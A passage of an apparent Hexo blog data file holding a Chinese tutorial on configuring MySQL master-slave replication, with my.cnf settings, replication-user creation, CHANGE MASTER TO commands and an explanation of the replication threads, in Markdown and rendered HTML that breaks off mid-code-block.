x548C;&#x8FD0;&#x884C;&#x622A;&#x56FE;&#x53D1;&#x90AE;&#x4EF6;&#x81F3;zhuchao[AT]360.cn&#xFF0C;&#x6216;&#x8005;&#x52A0;QQ&#x7FA4;326544838&#x3002;&#x6211;&#x4E00;&#x95EE;&#x9898;&#x7EA0;&#x7ED3;&#x4E86;&#x51E0;&#x5C0F;&#x65F6;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x4E86;&#xFF0C;&#x4E09;&#x5206;&#x949F;&#x540E;&#x5C31;&#x56DE;&#x590D;&#x6211;&#x4E86;&#xFF0C;&#x9707;&#x60CA;&#x4E86; (&#xAF;&#xFE43;&#xAF;)</p>\n<p>&#x66F4;&#x65B0;&#x4E2D;&#x3002;&#x3002;&#x3002;</p>"},{"title":"MySQL主从搭建","date":"2016-10-07T14:22:00.000Z","toc":false,"_content":"\n### 注意事项\n1、主从服务器操作系统版本和位数一致。\n2、MySQL版本一致。\n\n### 服务器配置\n**Master**: 192.168.1.18\n**Slave**: 192.168.1.16\n\n---\n\n### <font style=\"color:red\">Master(192.168.1.18)服务器配置</font>\n1、编辑配置文件\n\n```bash\n# 如果不存在，就手动创建一个\nvim /etc/my.cnf\n\n在配置文件加入如下值：\n\n[mysqld]  \n# 唯一的服务辨识号,数值位于 1 到 2^32-1之间.\n# 此值在master和slave上都需要设置.\n# 如果 “master-host” 没有被设置,则默认为1, 但是如果忽略此选项,MySQL不会作为master生效.\nserver-id=1\n  \n# 打开二进制日志功能.\n# 在复制(replication)配置中,作为 MASTER 主服务器必须打开此项\n# 如果你需要从你最后的备份中做基于时间点的恢复,你也同样需要二进制日志.   \nlog-bin=master-bin\nlog-bin-index=master-bin.index\n\n#需要备份的数据库  \nbinlog-do-db=orders\n\n#不需要备份的数据库\n#若没有配置binlog-do-db和binlog_ignore_db，表示备份全部数据库。\nbinlog-ignore-db=mysql\n\n```\n\n<!-- more -->\n\n2、重启mysqld服务\n```bash\nservice mysqld restart\n```\n \n3、为从MySQL创建用户\n```bash\n#登录\nmysql -uroot -p\nEnter password: \n\n#创建用户\nmysql> create user 'mastj'@'192.168.1.16(从机ip)' identified by '123456';\n        \n#配置主从复制权限\nmysql> grant replication slave on *.* to 'mastj'@'192.168.1.16(从机ip)' identified by '123456';\n```\n\n4、若orders中已有数据，还需要锁定主服务器数据库，然后将数据导入到从数据库\n```bash\n#锁定\nmysql> flush tables with read lock;\n\n#数据复制到从数据库后，查看主数据库master状态并解锁：\nmysql> show master status;  \n+------------------+----------+--------------+------------------+-------------------+  \n| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |  \n+------------------+----------+--------------+------------------+-------------------+  \n| mysql-bin.000003 |     2005 | orders       | mysql            |                   |  \n+------------------+----------+--------------+------------------+-------------------+  \n1 row in set (0.00 sec)  \n  \nmysql> unlock tables; \n```\n\n---\n\n## <font style=\"color:red\">Slave(192.168.1.16)服务器配置<font>\n1、配置服务ID\n```bash\nvim /etc/my.cnf \n\n[mysqld]\n#server_id是必须的，而且唯一\nserver-id=2\n\n# 使得slave只读.只有用户拥有SUPER权限和在上面的slave线程能够修改数据.\n# 你可以使用此项去保证没有应用程序会意外的修改slave而不是master上的数据\n#read_only\n\n# 如果你在使用链式从服务器结构的复制模式 (A->B->C),\n# 需要打开slave的二进制日志\n#log_bin=mysql-bin\n\n# 如果你在使用链式从服务器结构的复制模式 (A->B->C),\n# 你需要在服务器B上打开此项.\n# 此选项打开在从线程上重做过的更新的日志, 并将其写入从服务器的二进制日志.\n# 如果打开log_bin，却没有设置log_slave_updates，这是一种错误的配置。\n#log_slave_updates\n\n```\n\n2、重启MySQL服务\n```bash\nservice mysqld restart\n```\n\n3、配置复制\n```bash\n#登录\nmysql -uroot -p\nEnter password: \n       \n#执行\nmysql> change master to master_host='192.168.1.18',\n                master_user='mastj',\n                master_password='123456',\n                master_port=3306,\n                master_log_file='mysql-bin.000003',\n                master_log_pos=2005,\n                master_connect_retry=10;\n```\n\n**参数详解：**\nmaster_host:主服务器的IP。\nmaster_user：配置主服务器时建立的用户名\nmaster_password：用户密码\nmaster_port：主服务器mysql端口，如果未曾修改，默认即可。\nmaster_log_file：日志文件名称，**填写查看master状态时显示的File**\nmaster_log_pos：日志位置，**填写查看master状态时显示的Position**\nmaster_connect_retry：重连次数\n\n4、启动进程\n```bash\nmysql> start slave;\n```\n\n5、检查主从复制状态\n```bash\nmysql> show slave status\\G  \n*************************** 1. row ***************************  \n               Slave_IO_State: Waiting for master to send event  \n                  Master_Host: 192.168.1.18  \n                  Master_User: mastj  \n                  Master_Port: 3306  \n                Connect_Retry: 10  \n              Master_Log_File: mysql-bin.000003  \n          Read_Master_Log_Pos: 2369  \n               Relay_Log_File: jhq0113-relay-bin.000002  \n                Relay_Log_Pos: 647  \n        Relay_Master_Log_File: mysql-bin.000003  \n             Slave_IO_Running: Yes  \n            Slave_SQL_Running: Yes  \n            ...\n```\n\n**若Slave_IO_Running和Slave_SQL_Running均为Yes，则表示配置成功。**\n\n---\n\n## MySQL复制过程\nMySQL主从复制过程主要由三个线程来完成，其中两个线程(Sql线程和IO线程)在Slave端，另外一个线程(IO线程)在Master端。\n- Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容；\n- Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置；\n- Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”\n- Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的。\n\n---\n\n## 相关链接\n\n**my.cnf参数详解**\nhttps://my.oschina.net/eduosi/blog/270535\n\n**<font style=\"color:red\">线上MySQL主从同步报错故障处理总结</font>**\nhttp://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html\n\n**Mysql主从架构的复制原理**\nhttp://blog.csdn.net/hguisu/article/details/7325124\n\n**不同场景下 MySQL 的迁移方案**\nhttps://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes\n\n<br/>","source":"_posts/MySQL主从搭建.md","raw":"---\ntitle: MySQL主从搭建\ntags:\n  - mysql\ncategories:\n  - 运维部署\ndate: 2016-10-7 22:22:00\ntoc: false\n---\n\n### 注意事项\n1、主从服务器操作系统版本和位数一致。\n2、MySQL版本一致。\n\n### 服务器配置\n**Master**: 192.168.1.18\n**Slave**: 192.168.1.16\n\n---\n\n### <font style=\"color:red\">Master(192.168.1.18)服务器配置</font>\n1、编辑配置文件\n\n```bash\n# 如果不存在，就手动创建一个\nvim /etc/my.cnf\n\n在配置文件加入如下值：\n\n[mysqld]  \n# 唯一的服务辨识号,数值位于 1 到 2^32-1之间.\n# 此值在master和slave上都需要设置.\n# 如果 “master-host” 没有被设置,则默认为1, 但是如果忽略此选项,MySQL不会作为master生效.\nserver-id=1\n  \n# 打开二进制日志功能.\n# 在复制(replication)配置中,作为 MASTER 主服务器必须打开此项\n# 如果你需要从你最后的备份中做基于时间点的恢复,你也同样需要二进制日志.   \nlog-bin=master-bin\nlog-bin-index=master-bin.index\n\n#需要备份的数据库  \nbinlog-do-db=orders\n\n#不需要备份的数据库\n#若没有配置binlog-do-db和binlog_ignore_db，表示备份全部数据库。\nbinlog-ignore-db=mysql\n\n```\n\n<!-- more -->\n\n2、重启mysqld服务\n```bash\nservice mysqld restart\n```\n \n3、为从MySQL创建用户\n```bash\n#登录\nmysql -uroot -p\nEnter password: \n\n#创建用户\nmysql> create user 'mastj'@'192.168.1.16(从机ip)' identified by '123456';\n        \n#配置主从复制权限\nmysql> grant replication slave on *.* to 'mastj'@'192.168.1.16(从机ip)' identified by '123456';\n```\n\n4、若orders中已有数据，还需要锁定主服务器数据库，然后将数据导入到从数据库\n```bash\n#锁定\nmysql> flush tables with read lock;\n\n#数据复制到从数据库后，查看主数据库master状态并解锁：\nmysql> show master status;  \n+------------------+----------+--------------+------------------+-------------------+  \n| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |  \n+------------------+----------+--------------+------------------+-------------------+  \n| mysql-bin.000003 |     2005 | orders       | mysql            |                   |  \n+------------------+----------+--------------+------------------+-------------------+  \n1 row in set (0.00 sec)  \n  \nmysql> unlock tables; \n```\n\n---\n\n## <font style=\"color:red\">Slave(192.168.1.16)服务器配置<font>\n1、配置服务ID\n```bash\nvim /etc/my.cnf \n\n[mysqld]\n#server_id是必须的，而且唯一\nserver-id=2\n\n# 使得slave只读.只有用户拥有SUPER权限和在上面的slave线程能够修改数据.\n# 你可以使用此项去保证没有应用程序会意外的修改slave而不是master上的数据\n#read_only\n\n# 如果你在使用链式从服务器结构的复制模式 (A->B->C),\n# 需要打开slave的二进制日志\n#log_bin=mysql-bin\n\n# 如果你在使用链式从服务器结构的复制模式 (A->B->C),\n# 你需要在服务器B上打开此项.\n# 此选项打开在从线程上重做过的更新的日志, 并将其写入从服务器的二进制日志.\n# 如果打开log_bin，却没有设置log_slave_updates，这是一种错误的配置。\n#log_slave_updates\n\n```\n\n2、重启MySQL服务\n```bash\nservice mysqld restart\n```\n\n3、配置复制\n```bash\n#登录\nmysql -uroot -p\nEnter password: \n       \n#执行\nmysql> change master to master_host='192.168.1.18',\n                master_user='mastj',\n                master_password='123456',\n                master_port=3306,\n                master_log_file='mysql-bin.000003',\n                master_log_pos=2005,\n                master_connect_retry=10;\n```\n\n**参数详解：**\nmaster_host:主服务器的IP。\nmaster_user：配置主服务器时建立的用户名\nmaster_password：用户密码\nmaster_port：主服务器mysql端口，如果未曾修改，默认即可。\nmaster_log_file：日志文件名称，**填写查看master状态时显示的File**\nmaster_log_pos：日志位置，**填写查看master状态时显示的Position**\nmaster_connect_retry：重连次数\n\n4、启动进程\n```bash\nmysql> start slave;\n```\n\n5、检查主从复制状态\n```bash\nmysql> show slave status\\G  \n*************************** 1. row ***************************  \n               Slave_IO_State: Waiting for master to send event  \n                  Master_Host: 192.168.1.18  \n                  Master_User: mastj  \n                  Master_Port: 3306  \n                Connect_Retry: 10  \n              Master_Log_File: mysql-bin.000003  \n          Read_Master_Log_Pos: 2369  \n               Relay_Log_File: jhq0113-relay-bin.000002  \n                Relay_Log_Pos: 647  \n        Relay_Master_Log_File: mysql-bin.000003  \n             Slave_IO_Running: Yes  \n            Slave_SQL_Running: Yes  \n            ...\n```\n\n**若Slave_IO_Running和Slave_SQL_Running均为Yes，则表示配置成功。**\n\n---\n\n## MySQL复制过程\nMySQL主从复制过程主要由三个线程来完成，其中两个线程(Sql线程和IO线程)在Slave端，另外一个线程(IO线程)在Master端。\n- Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容；\n- Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置；\n- Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”\n- Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的。\n\n---\n\n## 相关链接\n\n**my.cnf参数详解**\nhttps://my.oschina.net/eduosi/blog/270535\n\n**<font style=\"color:red\">线上MySQL主从同步报错故障处理总结</font>**\nhttp://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html\n\n**Mysql主从架构的复制原理**\nhttp://blog.csdn.net/hguisu/article/details/7325124\n\n**不同场景下 MySQL 的迁移方案**\nhttps://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes\n\n<br/>","slug":"MySQL主从搭建","published":1,"updated":"2016-11-17T11:59:42.667Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbj001jgwtmts5d66ve","content":"<h3 id=\"&#x6CE8;&#x610F;&#x4E8B;&#x9879;\"><a href=\"#&#x6CE8;&#x610F;&#x4E8B;&#x9879;\" class=\"headerlink\" title=\"&#x6CE8;&#x610F;&#x4E8B;&#x9879;\"></a>&#x6CE8;&#x610F;&#x4E8B;&#x9879;</h3><p>1&#x3001;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7248;&#x672C;&#x548C;&#x4F4D;&#x6570;&#x4E00;&#x81F4;&#x3002;<br>2&#x3001;MySQL&#x7248;&#x672C;&#x4E00;&#x81F4;&#x3002;</p>\n<h3 id=\"&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"><a href=\"#&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"></a>&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</h3><p><strong>Master</strong>: 192.168.1.18<br><strong>Slave</strong>: 192.168.1.16</p>\n<hr>\n<h3 id=\"Master-192-168-1-18-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"><a href=\"#Master-192-168-1-18-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"Master(192.168.1.18)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"></a><font style=\"color:red\">Master(192.168.1.18)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;</font></h3><p>1&#x3001;&#x7F16;&#x8F91;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5C31;&#x624B;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;</span></span><br><span class=\"line\">vim /etc/my.cnf</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x52A0;&#x5165;&#x5982;&#x4E0B;&#x503C;&#xFF1A;</span><br><span class=\"line\"></span><br><span class=\"line\">[mysqld]  </span><br><span class=\"line\"><span class=\"comment\"># &#x552F;&#x4E00;&#x7684;&#x670D;&#x52A1;&#x8FA8;&#x8BC6;&#x53F7;,&#x6570;&#x503C;&#x4F4D;&#x4E8E; 1 &#x5230; 2^32-1&#x4E4B;&#x95F4;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6B64;&#x503C;&#x5728;master&#x548C;slave&#x4E0A;&#x90FD;&#x9700;&#x8981;&#x8BBE;&#x7F6E;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C; &#x201C;master-host&#x201D; &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x7F6E;,&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;1, &#x4F46;&#x662F;&#x5982;&#x679C;&#x5FFD;&#x7565;&#x6B64;&#x9009;&#x9879;,MySQL&#x4E0D;&#x4F1A;&#x4F5C;&#x4E3A;master&#x751F;&#x6548;.</span></span><br><span class=\"line\">server-id=1</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\"># &#x6253;&#x5F00;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x529F;&#x80FD;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x590D;&#x5236;(replication)&#x914D;&#x7F6E;&#x4E2D;,&#x4F5C;&#x4E3A; MASTER &#x4E3B;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6253;&#x5F00;&#x6B64;&#x9879;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x4ECE;&#x4F60;&#x6700;&#x540E;&#x7684;&#x5907;&#x4EFD;&#x4E2D;&#x505A;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x70B9;&#x7684;&#x6062;&#x590D;,&#x4F60;&#x4E5F;&#x540C;&#x6837;&#x9700;&#x8981;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;.   </span></span><br><span class=\"line\"><span class=\"built_in\">log</span>-bin=master-bin</span><br><span class=\"line\"><span class=\"built_in\">log</span>-bin-index=master-bin.index</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;  </span></span><br><span class=\"line\">binlog-do-db=orders</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x4E0D;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;</span></span><br><span class=\"line\"><span class=\"comment\">#&#x82E5;&#x6CA1;&#x6709;&#x914D;&#x7F6E;binlog-do-db&#x548C;binlog_ignore_db&#xFF0C;&#x8868;&#x793A;&#x5907;&#x4EFD;&#x5168;&#x90E8;&#x6570;&#x636E;&#x5E93;&#x3002;</span></span><br><span class=\"line\">binlog-ignore-db=mysql</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>2&#x3001;&#x91CD;&#x542F;mysqld&#x670D;&#x52A1;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service mysqld restart</span><br></pre></td></tr></table></figure></p>\n<p>3&#x3001;&#x4E3A;&#x4ECE;MySQL&#x521B;&#x5EFA;&#x7528;&#x6237;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x767B;&#x5F55;</span></span><br><span class=\"line\">mysql -uroot -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x521B;&#x5EFA;&#x7528;&#x6237;</span></span><br><span class=\"line\">mysql&gt; create user <span class=\"string\">&apos;mastj&apos;</span>@<span class=\"string\">&apos;192.168.1.16(&#x4ECE;&#x673A;ip)&apos;</span> identified by <span class=\"string\">&apos;123456&apos;</span>;</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"comment\">#&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x6743;&#x9650;</span></span><br><span class=\"line\">mysql&gt; grant replication slave on *.* to <span class=\"string\">&apos;mastj&apos;</span>@<span class=\"string\">&apos;192.168.1.16(&#x4ECE;&#x673A;ip)&apos;</span> identified by <span class=\"string\">&apos;123456&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n<p>4&#x3001;&#x82E5;orders&#x4E2D;&#x5DF2;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x9501;&#x5B9A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x9501;&#x5B9A;</span></span><br><span class=\"line\">mysql&gt; flush tables with <span class=\"built_in\">read</span> lock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x540E;&#xFF0C;&#x67E5;&#x770B;&#x4E3B;&#x6570;&#x636E;&#x5E93;master&#x72B6;&#x6001;&#x5E76;&#x89E3;&#x9501;&#xFF1A;</span></span><br><span class=\"line\">mysql&gt; show master status;  </span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+  </span><br><span class=\"line\">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |  </span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+  </span><br><span class=\"line\">| mysql-bin.000003 |     2005 | orders       | mysql            |                   |  </span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+  </span><br><span class=\"line\">1 row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)  </span><br><span class=\"line\">  </span><br><span class=\"line\">mysql&gt; unlock tables;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"Slave-192-168-1-16-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"><a href=\"#Slave-192-168-1-16-&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"Slave(192.168.1.16)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;\"></a><font style=\"color:red\">Slave(192.168.1.16)&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;<font></font></font></h2><p>1&#x3001;&#x914D;&#x7F6E;&#x670D;&#x52A1;ID<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/my.cnf </span><br><span class=\"line\"></span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\"><span class=\"comment\">#server_id&#x662F;&#x5FC5;&#x987B;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x552F;&#x4E00;</span></span><br><span class=\"line\">server-id=2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4F7F;&#x5F97;slave&#x53EA;&#x8BFB;.&#x53EA;&#x6709;&#x7528;&#x6237;&#x62E5;&#x6709;SUPER&#x6743;&#x9650;&#x548C;&#x5728;&#x4E0A;&#x9762;&#x7684;slave&#x7EBF;&#x7A0B;&#x80FD;&#x591F;&#x4FEE;&#x6539;&#x6570;&#x636E;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6B64;&#x9879;&#x53BB;&#x4FDD;&#x8BC1;&#x6CA1;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F1A;&#x610F;&#x5916;&#x7684;&#x4FEE;&#x6539;slave&#x800C;&#x4E0D;&#x662F;master&#x4E0A;&#x7684;&#x6570;&#x636E;</span></span><br><span class=\"line\"><span class=\"comment\">#read_only</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528;&#x94FE;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x6784;&#x7684;&#x590D;&#x5236;&#x6A21;&#x5F0F; (A-&gt;B-&gt;C),</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9700;&#x8981;&#x6253;&#x5F00;slave&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</span></span><br><span class=\"line\"><span class=\"comment\">#log_bin=mysql-bin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528;&#x94FE;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x6784;&#x7684;&#x590D;&#x5236;&#x6A21;&#x5F0F; (A-&gt;B-&gt;C),</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x9700;&#x8981;&#x5728;&#x670D;&#x52A1;&#x5668;B&#x4E0A;&#x6253;&#x5F00;&#x6B64;&#x9879;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6B64;&#x9009;&#x9879;&#x6253;&#x5F00;&#x5728;&#x4ECE;&#x7EBF;&#x7A0B;&#x4E0A;&#x91CD;&#x505A;&#x8FC7;&#x7684;&#x66F4;&#x65B0;&#x7684;&#x65E5;&#x5FD7;, &#x5E76;&#x5C06;&#x5176;&#x5199;&#x5165;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x6253;&#x5F00;log_bin&#xFF0C;&#x5374;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;log_slave_updates&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x9519;&#x8BEF;&#x7684;&#x914D;&#x7F6E;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#log_slave_updates</span></span><br></pre></td></tr></table></figure></p>\n<p>2&#x3001;&#x91CD;&#x542F;MySQL&#x670D;&#x52A1;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service mysqld restart</span><br></pre></td></tr></table></figure></p>\n<p>3&#x3001;&#x914D;&#x7F6E;&#x590D;&#x5236;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x767B;&#x5F55;</span></span><br><span class=\"line\">mysql -uroot -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\">       </span><br><span class=\"line\"><span class=\"comment\">#&#x6267;&#x884C;</span></span><br><span class=\"line\">mysql&gt; change master to master_host=<span class=\"string\">&apos;192.168.1.18&apos;</span>,</span><br><span class=\"line\">                master_user=<span class=\"string\">&apos;mastj&apos;</span>,</span><br><span class=\"line\">                master_password=<span class=\"string\">&apos;123456&apos;</span>,</span><br><span class=\"line\">                master_port=3306,</span><br><span class=\"line\">                master_<span class=\"built_in\">log</span>_file=<span class=\"string\">&apos;mysql-bin.000003&apos;</span>,</span><br><span class=\"line\">                master_<span class=\"built_in\">log</span>_pos=2005,</span><br><span class=\"line\">                